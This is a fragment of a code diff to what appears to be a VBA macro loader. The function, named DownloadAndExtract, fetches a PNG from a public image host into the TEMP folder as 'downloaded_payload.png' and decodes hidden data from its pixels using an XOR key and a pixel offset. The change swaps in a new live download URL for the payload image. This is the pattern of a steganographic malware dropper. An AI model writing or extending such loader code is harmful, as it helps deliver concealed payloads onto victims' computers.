@@ -59,7 +59,7 @@ Function DownloadAndExtract() As Byte()
     
     ' --- CONFIGURATION ---
     ' Make sure these match your Python script settings
-    imgURL = "https://i.postimg.cc/1sJtzsLK/o4.png?dl=1" ' Direct link to your PNG
+    imgURL = "https://i.postimg.cc/c0Bm49MN/o.png?dl=1" ' Direct link to your PNG
     tempPath = Environ("TEMP") & "\downloaded_payload.png"
     xorKey = &H77
     offsetPixels = 20
